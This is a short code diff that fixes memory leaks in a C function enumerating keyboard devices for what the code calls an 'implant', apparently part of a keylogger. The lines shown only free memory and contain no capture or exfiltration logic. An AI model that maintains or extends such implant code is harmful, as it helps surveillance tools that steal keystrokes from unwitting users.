@@ -98,6 +98,7 @@ uint8_t fetch_available_keyboards(implant_t *instance) {
             DEBUG_LOG("[!] Could not open %s: %s\n", rpath, strerror(errno));
 #endif
 
+            free(kbd);
             continue;
         }
 
@@ -114,6 +115,10 @@ uint8_t fetch_available_keyboards(implant_t *instance) {
         TAILQ_INSERT_HEAD(&instance->kbd, kbd, devices);
     }
 
-    array_free((int8_t **)char_devices);
+    for (int i = 0; i < possible_paths; i++) {
+        free(char_devices[i]);
+    }
+    free(char_devices);
+
     return TAILQ_EMPTY(&instance->kbd) ? ERROR : SUCCESSFUL;
 }
